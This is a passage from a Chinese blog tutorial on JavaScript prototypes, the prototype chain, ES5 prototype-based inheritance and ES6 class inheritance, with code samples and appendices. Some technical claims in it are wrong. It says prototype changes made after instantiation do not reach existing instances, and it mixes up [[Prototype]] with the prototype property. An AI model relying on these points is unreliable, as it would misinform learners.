title=\"显式原型：[[prototype]]\"></a>显式原型：<code>[[prototype]]</code></h3><ul>\n<li>函数作为一类特殊对象，在创建时将自动添加<code>[[prototype]]</code>属性</li>\n<li><code>[[prototype]]</code>指向一个拥有<code>constructor</code>属性的对象（指回该原型的构造函数），如果该函数作为构造函数被调用时（即通过new关键字调用），将自动创建该构造函数的实例</li>\n<li><code>[[prototype]]</code>同样拥有<code>__proto__</code>属性，指向上一层的对象原型，用于添加可继承的方法和属性</li>\n</ul>\n<p>实际上，JavaScript规定：任意函数对象都必须拥有内置属性<code>[[Prototype]]</code>，并据此实现原型链，这也是其被称为<strong>显式原型</strong>的原因。</p>\n<p>但是，该规范要求并没有定义<strong>如何实现</strong>以及<strong>如何访问</strong>这个内置属性，而是由各个浏览器自行负责技术实现，大多数浏览器的解决方案都是设置<code>__proto__</code>属性用于访问<code>[[Prototype]]</code>属性，但这并不是统一标准，这也是其被称为<strong>隐式原型</strong>的原因。</p>\n<p>后来，EMCAScript对此进行了进一步规范：</p>\n<ul>\n<li>ES5 定义了<code>Object.getPrototypeOf</code>方法，可以获得一个对象的<code>[[Prototype]]</code>属性</li>\n<li>ES6 定义了<code>Object.setPrototypeOf</code>方法，可以直接修改一个对象的<code>[[Prototype]]</code>属性</li>\n</ul>\n<h3 id=\"通过new创建对象\"><a href=\"#通过new创建对象\" class=\"headerlink\" title=\"通过new创建对象\"></a>通过<code>new</code>创建对象</h3><p>EMCAScript 5提供了<code>new</code>关键字，用于创建对象实例，其主要步骤参见myNew的伪代码：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">myNew</span>(<span class=\"params\">Fn, ...param</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 1. 创建一个空对象&#123;&#125;</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br><span class=\"line\">    <span class=\"comment\">// 2. 设置新对象的原型链指向obj</span></span><br><span class=\"line\">    obj.<span class=\"property\">__proto__</span> = <span class=\"title class_\">Fn</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>;</span><br><span class=\"line\">    <span class=\"comment\">// 3. 将新对象作为`this`指向obj，并调用其构造函数</span></span><br><span class=\"line\">    <span class=\"comment\">// 注意call()调用，并支持构造函数的传参</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> result = <span class=\"title class_\">Fn</span>.<span class=\"title function_\">call</span>(obj, ...param);</span><br><span class=\"line\">    <span class=\"comment\">// 4. 将新对象作为返回值</span></span><br><span class=\"line\">    <span class=\"comment\">// 注意：需要判断Func的返回值类型：如果是值类型，返回obj；如果是引用类型，就返回这个引用类型的对象    </span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">typeof</span> result === <span class=\"string\">&#x27;object&#x27;</span>          </span><br><span class=\"line\">        || <span class=\"keyword\">typeof</span> result === <span class=\"string\">&#x27;function&#x27;</span> ? result : obj</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以上步骤完成后，新对象实例就与其原型<code>Person</code>再无联系，这个时候即使其原型<code>Person</code>后续增加了成员属性，都不再影响已经实例化的新对象了。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">person1.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>                  <span class=\"comment\">// true</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>        <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\">person1.<span class=\"property\">constructor</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">constructor</span>    <span class=\"comment\">// true</span></span><br><span class=\"line\">person1.<span class=\"property\">constructor</span> === <span class=\"title class_\">Person</span>.<span class=\"property\">__proto__</span>.<span class=\"property\">constructor</span>    <span class=\"comment\">// false</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"原型链的示例\"><a href=\"#原型链的示例\" class=\"headerlink\" title=\"原型链的示例\"></a>原型链的示例</h3><p>以person1为例，我们来看看原型链是如何实现的：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">person1 ---&gt; Person.Prototype ---&gt; Object.Prototype ---&gt; null</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/class5.jpg\" alt=\"原型链的全貌\"></p>\n<p><img src=\"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/prototype.png\" alt=\"prototype示例\"></p>\n<ul>\n<li><code>name</code>：person1拥有的实例属性</li>\n<li><code>sayName</code>：person1拥有的实例方法</li>\n<li><code>[[Prototype]]</code>：是person1的原型链，指向实例的原型对象<code>Person.Prototype</code></li>\n</ul>\n<p>进一步，我们来分析原型对象<code>Person.Prototype</code>的内容：</p>\n<ul>\n<li><code>constructor</code>：就是一个指针，指回该原型的构造函数<code>Person.constructor</code></li>\n<li><code>[[Prototype]]</code>：还是一个原型链，指向该原型的上一层原型<code>Object.[[Prototype]]</code></li>\n</ul>\n<p>换一个角度，我们来看看person1实例的表现形式。奇怪的是，我们可以看到<code>name</code>属性和<code>sayName</code>方法，但是<code>[[Prototype]]</code>在哪里呢？</p>\n<p><img src=\"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/instance.png\" alt=\"实例的属性\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"title function_\">getPrototypeOf</span>(person1) === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>     <span class=\"comment\">// true</span></span><br><span class=\"line\">preson1.<span class=\"property\"><span class=\"keyword\">prototype</span></span>                                       <span class=\"comment\">// undefined</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>                  <span class=\"comment\">// true</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>        <span class=\"comment\">// false</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>        <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、原型继承（ES5）\"><a href=\"#三、原型继承（ES5）\" class=\"headerlink\" title=\"三、原型继承（ES5）\"></a>三、原型继承（ES5）</h2><p>基于类的面向对象编程中，类继承(Inherit)是非常重要的特征，其本质是子类对父类定义的扩展。</p>\n<h3 id=\"实例在前，继承在后\"><a href=\"#实例在前，继承在后\" class=\"headerlink\" title=\"实例在前，继承在后\"></a>实例在前，继承在后</h3><p>由于ES5不支持<code>Class</code>关键字，这就意味着根本不存在类定义，那如何实现类定义的扩展呢？还是老办法，通过函数来<strong>模拟</strong>。<br>解决方案：先创造一个独立的子类的实例对象，然后再将父类的方法添加到这个对象上面，即：<strong>实例在前，继承在后</strong>。</p>\n<p>具体来说，原型继承有两个核心问题要解决：一是如何将父类的实例属性传递给子类，也就是构造函数继承问题；二是如何将父类原型的方法传递给子类？也就是原型链继承问题。</p>\n<h3 id=\"原型链继承方案\"><a href=\"#原型链继承方案\" class=\"headerlink\" title=\"原型链继承方案\"></a>原型链继承方案</h3><p>核心思想：子类的原型指向父类的一个实例</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Child</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Parent</span>();</span><br></pre></td></tr></table></figure>\n\n<p>优点：由于方法定义在父类的原型上，可以直接复用父类构造函数中的方法<br>缺点：创建子类实例的时候，不能传参数；由于子类实例共享了父类构造函数的引用属性，不同子类实例的引用属性可能互相污染</p>\n<h3 id=\"构造函数继承方案\"><a href=\"#构造函数继承方案\" class=\"headerlink\" title=\"构造函数继承方案\"></a>构造函数继承方案</h3><p>核心思想：借用父类的构造函数来增强子类实例，等于是复制父类的实例属性给子类</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Child</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">Parent</span>.<span class=\"title function_\">call</span>(<span class=\"variable language_\">this</span>,name);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>优点：创建子类实例，可以向父类构造函数传参数；不同子类实例之间独立，引用属性不存在污染<br>缺点：子类实例无法继承父类原型的方法</p>\n<h3 id=\"完美组合方案\"><a href=\"#完美组合方案\" class=\"headerlink\" title=\"完美组合方案\"></a>完美组合方案</h3><p>由于两种基本方法都存在缺陷，随后提出了组合继承、寄生继承等不同优化方案，最后整合为本完美组合的方案，这也是ES5的推荐方案。</p>\n<p><img src=\"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/extends-es5.png\" alt=\"原型继承\"></p>\n<ul>\n<li>采用组合继承方案，将发生两次父类构造函数的调用，一是子类构造函数的<code>Parent.call(this,name,like)</code>，二是创建父类实例<code>Child.prototype = new Parent()</code>，虽然内容一致不会报错，但是冗余代码影响执行效率，也不优美！</li>\n<li>采用优化的组合继承方案，通过<code>Child.prototype = Parent.prototype</code>替换<code>Child.prototype = new Parent()</code>，虽然不再产生二次构造函数调用，但是子类的原型被强制指向父类的原型，造成实质上子类原型和父类原型是同一个，必须手工进行修正</li>\n<li>完美组合方案进行了进一步优化，解决方案是通过<code>Object.create()</code>方法通过一个桥接的空函数，实现父类原型和子类原型的分离，具体参见附录三</li>\n</ul>\n<h3 id=\"原型继承的示例\"><a href=\"#原型继承的示例\" class=\"headerlink\" title=\"原型继承的示例\"></a>原型继承的示例</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Parent</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name; <span class=\"comment\">// 实例基本属性 (该属性，强调私有，不共享)</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">arr</span> = [<span class=\"number\">1</span>]; <span class=\"comment\">// (该属性，强调私有)</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Parent</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">say</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123; <span class=\"comment\">// --- 将需要复用、共享的方法定义在父类原型上 </span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;hello&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">Child</span>(<span class=\"params\">name,like</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 核心！通过构造函数继承父类实例的属性和方法</span></span><br><span class=\"line\">    <span class=\"title class_\">Parent</span>.<span class=\"title function_\">call</span>(<span class=\"variable language_\">this</span>,name,like) </span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">like</span> = like;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 核心！通过原型链继承父类原型的属性和方法，并通过构造中间对象隔离子类原型和父类原型</span></span><br><span class=\"line\"><span class=\"title class_\">Child</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = <span class=\"title class_\">Object</span>.<span class=\"title function_\">create</span>(<span class=\"title class_\">Parent</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 关键！修复构造函数指向的代码</span></span><br><span class=\"line\"><span class=\"title class_\">Child</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">constructor</span> = <span class=\"title class_\">Child</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> boy1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Child</span>(<span class=\"string\">&#x27;小红&#x27;</span>,<span class=\"string\">&#x27;apple&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> boy2 = <span class=\"keyword\">new</span> <span class=\"title class_\">Child</span>(<span class=\"string\">&#x27;小明&#x27;</span>,<span class=\"string\">&#x27;orange&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> p1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Parent</span>(<span class=\"string\">&#x27;小爸爸&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Class继承（ES6）\"><a href=\"#四、Class继承（ES6）\" class=\"headerlink\" title=\"四、Class继承（ES6）\"></a>四、Class继承（ES6）</h2><h3 id=\"继承在前，实例在后\"><a href=\"#继承在前，实例在后\" class=\"headerlink\" title=\"继承在前，实例在后\"></a>继承在前，实例在后</h3><p>尽管ES5可以基本准确地实现类继承，但是需要编写大量代码，而且难以理解，为此ES6正式引入了<code>Class</code>关键字，并通过<code>extends</code>关键字实现继承。<br>由于ES6可以支持类定义，其继承机制就调整为：先将父类的属性和方法，加到一个空的对象上面，然后再将该对象作为子类的实例，即：<strong>继承在前，实例在后</strong>。</p>\n<ul>\n<li>一个类必须有<code>constructor()</code>方法，如果没有显式定义，一个空的<code>constructor()</code>方法会被默认添加</li>\n<li>子类必须在<code>constructor()</code>方法中调用<code>super()</code>，否则新建实例会报错就会报错</li>\n<li>通过<code>new</code>命令生成对象实例时，自动调用其构造方法</li>\n<li>类的所有方法都定义在类的原型上，在类的内部定义方法不用加<code>function</code>关键字</li>\n</ul>\n<blockquote>\n<p>子类的构造函数通过继承父类的this对象，并对其进行加工，因此如果不调用<code>super()</code>方法，子类就得不到this对象</p>\n</blockquote>\n<h3 id=\"两条继承链\"><a href=\"#两条继承链\" class=\"headerlink\" title=\"两条继承链\"></a>两条继承链</h3><p>Class 作为构造函数的语法糖，类定义同时拥有<code>prototype</code>属性和<code>__proto__</code>属性，并由此构造了两条继承链，分别用于属性继承和方法继承。<br><code>extends</code>关键字不仅可以用来继承类，还可以用来继承原生的构造函数。因此可以在原生数据结构的基础上，定义自己的数据结构</p>\n<ul>\n<li>子类的__proto__属性：表示构造函数的继承，总是指向父类</li>\n<li>子类prototype属性的__proto__属性：表示方法的继承，总是指向父类的prototype属性</li>\n</ul>\n<p>需要注意的是，ES6的<code>Class</code>关键字并未修改底层设计，实际就是一个语法糖，所有功能ES5都可以实现，只是更加清晰和方便了！</p>\n<p><img src=\"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/extends-es6.png\" alt=\"Class继承\"></p>\n<h3 id=\"Class继承的示例\"><a href=\"#Class继承的示例\" class=\"headerlink\" title=\"Class继承的示例\"></a>Class继承的示例</h3><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Parent</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_\">constructor</span>(<span class=\"params\">name</span>) &#123;</span><br><span class=\"line\">       <span class=\"variable language_\">this</span>.<span class=\"property\">name</span> = name;</span><br><span class=\"line\">       <span class=\"variable language_\">this</span>.<span class=\"property\">arr</span> = [<span class=\"number\">1</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"title function_\">say</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;hello&#x27;</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Child</span> <span class=\"keyword\">extends</span> <span class=\"title class_ inherited__\">Parent</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_\">constructor</span>(<span class=\"params\">name, like</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">super</span>(name);</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">like</span> = like;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> boy1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Child</span>(<span class=\"string\">&#x27;小红&#x27;</span>,<span class=\"string\">&#x27;apple&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> boy2 = <span class=\"keyword\">new</span> <span class=\"title class_\">Child</span>(<span class=\"string\">&#x27;小明&#x27;</span>,<span class=\"string\">&#x27;orange&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> p1 = <span class=\"keyword\">new</span> <span class=\"title class_\">Parent</span>(<span class=\"string\">&#x27;小爸爸&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>可以通过以下测试检查Class继承的准确性。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">boy1.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Child</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>                  <span class=\"comment\">// true  </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Child</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Parent</span>                          <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"title class_\">Child</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Parent</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>      <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"title function_\">getPrototypeOf</span>(boy1) === <span class=\"title class_\">Child</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>     <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"title function_\">getPrototypeOf</span>(<span class=\"title class_\">Child</span>) === <span class=\"title class_\">Parent</span>             <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"附录一：Object和Function，先有鸡还是先有蛋？\"><a href=\"#附录一：Object和Function，先有鸡还是先有蛋？\" class=\"headerlink\" title=\"附录一：Object和Function，先有鸡还是先有蛋？\"></a>附录一：Object和Function，先有鸡还是先有蛋？</h2><p>JavaScript语言的数据类型由基本类型和对象类型两类组成。</p>\n<ol>\n<li><p>基本类型：直接表示在语言底层的不可变数据，也称为值类型，包括：</p>\n<ul>\n<li>String：字符串类型</li>\n<li>Number：数字类型</li>\n<li>Boolean：布尔类型</li>\n<li>Null：空类型</li>\n<li>Undefined：未定义类型</li>\n<li>BigInt：大整数类型</li>\n<li>Symbol：符号类型，表示独一无二的值，ES6引入</li>\n</ul>\n</li>\n<li><p>对象类型：一种无序的集合数据类型，由若干键值对(Key : Value)组成，用于描述现实世界某个对象的一组属性。</p>\n<ul>\n<li>Object：对象类型，这是最基本的对象类型</li>\n<li>Function：函数类型，由Object构造而来，最重要的一等公民</li>\n<li>数组（Array）、正则（RegExp）、日期（Date）等都是Object衍生的对象类型</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"万物始祖-Object\"><a href=\"#万物始祖-Object\" class=\"headerlink\" title=\"万物始祖 - Object\"></a>万物始祖 - Object</h3><p>在JavaScript的世界里，万物皆对象！<br><code>Object.[[Prototype]]</code>就是万物的始祖，继承于虚无。<br>Object是对象的始祖，但也是一个函数。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">__proto__</span> === <span class=\"literal\">null</span>             <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>         <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"一等公民-Function\"><a href=\"#一等公民-Function\" class=\"headerlink\" title=\"一等公民 - Function\"></a>一等公民 - Function</h3><p>在JavaScript的世界里，函数是一等公民！<br><code>Function.[[Prototype]]</code>是函数的原型，也是对象，同样源自于<code>Object.[[Prototype]]</code><br><code>Object.[[Prototype]]</code>的具体实现<code>Object.__proto__</code>，指向函数的原型<code>Function.[[Prottype]]</code><br><code>Function.[[Prototype]]</code> 是个特殊的函数对象，它忽略参数总是返回 undefined，且没有 <code>[[Construct]]</code>内部方法<br>通过<code>Function.prototype.bind</code>方法构造出来的函数是个例外，它没有<code>[[Prototype]]</code>属性</p>\n<p><img src=\"/2022/06/04/JavaScript%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90%E4%B9%8B%E4%B8%80%EF%BC%9A%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/Object-Function3.jpg\" alt=\"Object和Function的关系\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>       <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> === <span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>                 <span class=\"comment\">// false</span></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Function</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>                 <span class=\"comment\">// true</span></span><br><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Function</span>.<span class=\"property\">__proto__</span>                 <span class=\"comment\">// true</span></span><br></pre></td></tr></table></figure>\n\n<p>最后总结一下：</p>\n<ul>\n<li><code>Object.prototype</code>是原型链的顶端，<code>Function.prototype</code>继承<code>Object.prototype</code>而产生</li>\n<li><code>Function</code>、<code>Object</code>以及其它构造函数，都是继承<code>Function.prototype</code>而产生</li>\n</ul>\n<h2 id=\"附录二：判断原型和实例之间关系的Object内置方法\"><a href=\"#附录二：判断原型和实例之间关系的Object内置方法\" class=\"headerlink\" title=\"附录二：判断原型和实例之间关系的Object内置方法\"></a>附录二：判断原型和实例之间关系的Object内置方法</h2><p><code>Object.[[prototype]]</code>内置了几个方法，用于判断原型和实例的关系，也可以验证以上实现原理。</p>\n<ul>\n<li><p><code>instanceof</code>：这个操作符用于判断对象和原型之间的关系</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">person1 <span class=\"keyword\">instanceof</span> <span class=\"title class_\">Person</span>               <span class=\"comment\">// true</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>  <span class=\"comment\">// true，两种方式等价</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>isPrototypeOf</code>：如果<code>[[prototype]]</code>指向调用此方法的对象，那么这个方法就会返回true</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"title function_\">isPrototypeOf</span>(person1) <span class=\"comment\">// true</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>  <span class=\"comment\">// true，两种方式等价</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><code>Object.getPrototypeOf</code>：这个方法返回<code>[[Prototype]]</code>的值,可以获取到一个对象的原型</p>\n  <figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Object</span>.<span class=\"title function_\">getPrototypeOf</span>(person1) === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span> <span class=\"comment\">// true</span></span><br><span class=\"line\">person1.<span class=\"property\">__proto__</span> === <span class=\"title class_\">Person</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>  <span class=\"comment\">// true，两种方式等价</span></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 id=\"附录三：Object-create-方法\"><a href=\"#附录三：Object-create-方法\" class=\"headerlink\" title=\"附录三：Object.create()方法\"></a>附录三：Object.create()方法</h2><p>2006年，为了完美解决类继承的问题，javascript之父道格拉斯提出，借助一个空函数作为中间对象来实现正确的原型链，示例代码为：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">object</span>(<span class=\"params\">o</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">F</span>(<span class=\"params\"></span>) &#123; &#125;;   <span class=\"comment\">// 定义一个空函数</span></span><br><span class=\"line\">    F.<span class=\"property\"><span class=\"keyword\">prototype</span></span> = o;    <span class=\"comment\">// 指定空函数的原型为父类</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title function_\">F</span>();     <span class=\"comment\">// 创建并返回该空函数的实例，作为类继承的中间对象</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>EMCAScript 5实现了道爷的奇思妙想，并将上述代码封装为Object.create()方法。</p>\n<p><code>Object.create(proto[, propertiesObject])</code></p>\n<ul>\n<li>proto：必填参数，指定新对象的原型对象。注意，如果是null，那新对象就是一个彻底的空对象，没有继承Object.prototype上的任何属性和方法，如hasOwnProperty()、toString()等</li>\n<li>propertiesObject：可选参数，指定要添加到新对象上的可枚举的属性（即其自定义的属性和方法，可用hasOwnProperty()获取的，而不是原型对象上的）的描述符及相应的属性名称</li>\n</ul>\n<hr>\n<h3 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h3><ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Details_of_the_Object_Model\">JavaScript对象模型设计 - Mozilla官方</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain\">继承与原型链 - Mozilla官方</a></li>\n<li><a href=\"https://wangjintian.com/2021/04/18/ES6%E7%AF%87-class%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/\">ES6篇 - class 基本语法</a></li>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/1022910821149312/1023021997355072\">原型继承和Class继承 - 廖雪峰</a></li>\n<li><a href=\"https://xieyufei.com/2020/04/10/Js-Class-Inherit.html\">一文读懂JS中类、原型和继承</a></li>\n<li><a href=\"https://blog.csdn.net/prehistorical/article/details/53671415\">基于类 vs 基于原型</a></li>\n<li><a href=\"https://oychao.github.io/2016/11/28/javascript/21_oop/\">JavaScript基于原型的面向对象编程</a></li>\n<li><a href=\"https://chenzhuo1024.github.io/tech/js/js-oo.html\">JavaScript对象模型与原型体系</a></li>\n<li><a href=\"https://www.zhihu.com/question/34183746/answer/58155878\">js中__proto__和prototype的区别和关系？</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000022776150\">JS中的构造函数、原型、原型链</a></li>\n<li><a href=\"https://github.com/creeperyang/blog/issues/9\">从__proto__和prototype来深入理解JS对象和原型链</a></li>\n<li><a href=\"https://www.yixuebiancheng.com/article/74630.html\">JS function 是函数也是对象, 浅谈原型链</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000015216289\">js继承的5种方法</a></li>\n<li><a href=\"https://xieyufei.com/2020/04/10/Js-Class-Inherit.html\">一文读懂JS中类、原型和继承</a></li>\n<li><a href=\"https://www.jianshu.com/p/1aa2755171fe\">ES5&#x2F;ES6 的继承除了写法以外还有什么区别</a></li>\n<li><a href=\"https://www.jianshu.com/p/59e6dca643ad\">JS继承 -&gt; ES6的class和decorator</a></li>\n<li><a 